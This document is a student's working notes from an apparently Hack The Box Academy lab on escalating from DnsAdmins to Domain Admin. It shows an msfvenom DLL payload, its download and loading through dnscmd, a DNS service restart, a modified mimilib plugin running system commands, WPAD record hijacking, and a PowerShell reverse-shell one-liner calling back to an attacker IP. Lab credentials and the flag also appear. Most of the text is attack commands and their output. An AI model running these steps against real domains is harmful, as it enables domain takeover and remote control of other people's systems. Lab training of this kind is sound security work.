# DnsAdmins

The DNS service runs as NT AUTHORITY\SYSTEM, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain.

## Leveraging DnsAdmins Access

1) Generating Malicious DLL

```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```

2) Starting Local HTTP Server

```
python3 -m http.server 7777

Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -
```

3) Downloading File to Target

```
PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

4) Loading DLL as Non-Privileged User

```
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

5) Loading DLL as Member of DnsAdmins

```
Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109
```

6) Loading Custom DLL

```
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

7) Finding User's SID

```
wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

8) Checking Permissions on DNS Service

```
sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

9) Stopping the DNS Service

```
sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
```

10) Starting the DNS Service

```
sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 6960
        FLAGS              :
```

11) Confirming Group Membership

```
net group "Domain Admins" /dom

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

## Cleaning Up

Confirming Registry Key Added

```
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
```

Deleting Registry Key

```
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

Starting the DNS Service Again

```
sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4984
        FLAGS              :
```

Checking DNS Service Status

```
sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

## Using Mimilib.dll

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}

## Creating a WPAD Record

1) Disabling the Global Query Block List

```
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

2) Adding a WPAD Record pointing to our attack machine

```
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

## LAB

xfreerdp /v:10.129.175.116 /u:netadm /p:HTB_@cademy_stdnt!



msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 9216 bytes
Saved as: adduser.dll


python3 -m http.server 7777

PS C:\Users\netadm> wget "http://10.10.15.249:7777/adduser.dll" -outfile "adduser.dll"
PS C:\Users\netadm> dir


    Directory: C:\Users\netadm


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/19/2021   1:38 PM                3D Objects
d-r---        5/19/2021   1:38 PM                Contacts
d-r---         6/8/2021   9:19 PM                Desktop
d-r---        5/19/2021   1:38 PM                Documents
d-r---        5/19/2021   1:38 PM                Downloads
d-r---        5/19/2021   1:38 PM                Favorites
d-r---        5/19/2021   1:38 PM                Links
d-r---        5/19/2021   1:38 PM                Music
d-r---        5/19/2021   1:38 PM                Pictures
d-r---        5/19/2021   1:38 PM                Saved Games
d-r---        5/19/2021   1:38 PM                Searches
d-r---        5/19/2021   1:38 PM                Videos
-a----        1/31/2024   3:55 AM           9216 adduser.dll


C:\Users\netadm>dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.


PS C:\Tools> Get-ADGroupMember -Identity DnsAdmins


distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109

C:\Users\netadm>dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

C:\Users\netadm>wmic useraccount where name="netadm" get sid
SID
S-1-5-21-669053619-2741956077-1013132368-1109

C:\Users\netadm>sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)

C:\Users\netadm>sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530


C:\Users\netadm>sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4136
        FLAGS              :


C:\Users\netadm>net group "Domain Admins" /dom
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.

type c:\Users\Administrator\Desktop\DnsAdmins\flag.txt

C:\Users\netadm>type c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
Access is denied.

Run CMD as administrator :

C:\Users\netadm>type c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
Access is denied.

PS C:\Tools> Get-ADGroupMember -Identity "Domain Admins"


distinguishedName : CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : Administrator
objectClass       : user
objectGUID        : f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName    : Administrator
SID               : S-1-5-21-669053619-2741956077-1013132368-500

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109

https://www.revshells.com/

$PSVersionTable

Name                           Value
----                           -----
PSVersion                      5.1.17763.1
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.17763.1
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1



cmd :

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.249',9500);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

nc -lvnp 9500

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9500
Ncat: Listening on 0.0.0.0:9500
id
Ncat: Connection from 10.129.43.42.
Ncat: Connection from 10.129.43.42:62369.
PS C:\Users\netadm> 

PS C:\Users\netadm> cd c:\Users	
PS C:\Users> cd Administrator
PS C:\Users\Administrator> dir
PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator> 



takeown /f 'c:\Users\Administrator\Desktop\DnsAdmins\flag.txt'

Get-ChildItem -Path 'c:\Users\Administrator\Desktop\DnsAdmins\flag.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
Get-ChildItem : Access is denied
At line:1 char:1

icacls 'c:\Users\Administrator\Desktop\DnsAdmins\flag.txt' /grant htb-student:F
c:\Users\Administrator\Desktop\DnsAdmins\flag.txt: Access is denied.
Successfully processed 0 files; Failed processing 1 files


/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("type c:\Users\Administrator\Desktop\DnsAdmins\flag.txt");
	}
	return ERROR_SUCCESS;
}

--> Not tryed beacause too complex to install Mimikatz on target

PS C:\Tools> Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\DnsAdmins\flag.txt' .\flag_dns.txt
Copied 14 bytes

cat .\flag_dns.txt
Dll_abus3_ftw!